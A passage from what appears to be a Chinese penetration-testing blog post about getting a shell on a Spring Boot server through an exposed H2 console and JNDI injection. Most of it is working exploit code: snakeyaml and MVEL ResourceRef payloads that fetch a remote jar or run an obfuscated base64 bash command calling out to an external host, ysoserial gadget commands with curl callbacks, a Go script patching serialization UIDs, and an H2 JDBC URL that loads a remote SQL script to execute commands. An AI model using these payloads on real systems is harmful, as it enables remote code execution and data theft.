cb17、mvel、snakeyaml</code>等，其中<code>cc1、cb17</code>这些链属于LDAP反序列化，<code>mvel、snkeyaml</code>属于加载本地Class。<br>浅蓝师傅在<a href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a>里面讲的很详细，这里选择使用<code>snkeyml</code>攻击，主要利用代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>            <span class="token string">"]"</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在服务端使用RMI托管，然后开启<a href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>，可以成功执行命令。</p><h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>在更换MVEL执行的时候，本地测试弹计算器成功，但是换成执行命令就会失败，使用IDEA本地调试之后发现把push去掉，然后可以执行命令成功，具体原因需要再跟踪一遍：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span><span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用LDAP返回反序列化数据，触发本地Gadget绕过"><a href="#利用LDAP返回反序列化数据，触发本地Gadget绕过" class="headerlink" title="利用LDAP返回反序列化数据，触发本地Gadget绕过"></a>利用LDAP返回反序列化数据，触发本地Gadget绕过</h3><p>LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的<code>javaSerializedData</code>属性值不为空，则客户端的<code>obj.decodeObject()</code>方法就会对这个字段的内容进行反序列化，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。</p><p>使用CC链可以测试成功，可以执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopyjava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是在使用CB链的时候，执行命令失败:<br><img src="/2022/03/18/from-spring-boot-to-getshell/3.png"><br>可以从报错原因看出来，因为CommonsBeanutils1的版本不同，不同版本中BeanComparator这个类的<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUID不一样</a>，会造成反序列化失败。1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608。<br>有两种解决方法：</p><ul><li>替换ysoserial的CommonsBeanutils1，使用<a href="http://wjlshare.com/archives/1575">魔改版本的ysoserial</a></li><li>生成反序列化数据之后，<a href="https://github.com/phith0n/zkar">修改SUID</a>为对应版本的值</li></ul><p>刚好早上看到P师傅发的文章，尝试使用<a href="https://github.com/phith0n/zkar">zkar</a>修改ysoserial生成的序列化数据包，可以执行命令成功。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/phith0n/zkar/serz"</span><span class="token string">"io/ioutil"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span><span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span><span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p>参考su18师傅的<a href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">h2-rce</a>：</p><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;poc.sql&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>远程服务器的恶意SQL:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS <span class="token keyword">EXEC</span> <span class="token keyword">AS</span> <span class="token string">'String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return "su18";&#125;'</span><span class="token punctuation">;</span><span class="token keyword">CALL</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'open -a Calculator.app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Spring &lt; 2.3.0的时候，会默认创建<code>jdbc:h2:mem:testdb</code>，Spring &gt;= 2.3.0的时候，Spring会自动创建一个UUID随机数据库名，数据库名可以在Spirng的日志里看到。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>RMI托管在VPS的时候，修改<a href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>为自己服务器的IP地址</li><li>在完全黑盒的情况下，注意SerialVersionUID不匹配的问题，具体见<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://81.68.118.217/index.php/archives/62/">JNDI注入高版本绕过</a></li><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li><li><a href="http://wjlshare.com/archives/1575">ysoserial 工具改造</a></li><li><a href="https://github.com/phith0n/zkar">zkar</a></li><li><a href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack">jdbc-connection-url-attack</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-切入点&quot;&gt;&lt;a href=&quot;#0x1-切入点&quot; class=&quot;headerlink&quot; title=&quot;0x1. 切入点&quot;&gt;&lt;/a&gt;0x1. 切入点&lt;/h2&gt;&lt;p&gt;在日常测试的时候，使用ffuf发现一个&lt;code&gt;/console&lt;/code&gt;的接口，打开之后发现是H2 Database页面：&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/1.png&quot;&gt;&lt;br&gt;如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在&lt;a href=&quot;https://anquan.baidu.com/article/1078&quot;&gt;JNDI注入漏洞&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;设置&lt;code&gt;Driver Class&lt;/code&gt;为&lt;code&gt;javax.naming.InitialContext&lt;/code&gt;，&lt;code&gt;JDBC URL&lt;/code&gt;为&lt;code&gt;ldap://attacker.com/Exploit&lt;/code&gt;：&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/2.png&quot;&gt;&lt;br&gt;根据&lt;code&gt;/env&lt;/code&gt;泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true&lt;br&gt;LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x2-绕过和利用&quot;&gt;&lt;a href=&quot;#0x2-绕过和利用&quot; class=&quot;headerlink&quot; title=&quot;0x2. 绕过和利用&quot;&gt;&lt;/a&gt;0x2. 绕过和利用&lt;/h2&gt;&lt;h3 id=&quot;利用本地Class作为Reference-Factory绕过&quot;&gt;&lt;a href=&quot;#利用本地Class作为Reference-Factory绕过&quot; class=&quot;headerlink&quot; title=&quot;利用本地Class作为Reference Factory绕过&quot;&gt;&lt;/a&gt;利用本地Class作为Reference Factory绕过&lt;/h3&gt;&lt;p&gt;利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw&quot;&gt;Urldns链探测类工具发放&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA&quot;&gt;构造java探测class反序列化gadget&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA&quot;&gt;老链新用，利用URLDNS链探测gadget&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;URLDNS的测试代码，生成一个序列化的数据包&lt;code&gt;1.ser&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Urldns&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt; hashMap &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt; url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;http://333.f9575af1.dns.1433.eu.org&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hashCode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token comment&quot;&gt;//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);&lt;/span&gt;
          hashMap&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.apache.commons.beanutils.BeanComparator&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt; oos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;1.ser&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        oos&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;writeObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;hashMap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;1.ser&quot;));&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ois.readObject();&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt; classPool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDefault&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt; ctClass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; classPool&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;defrost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
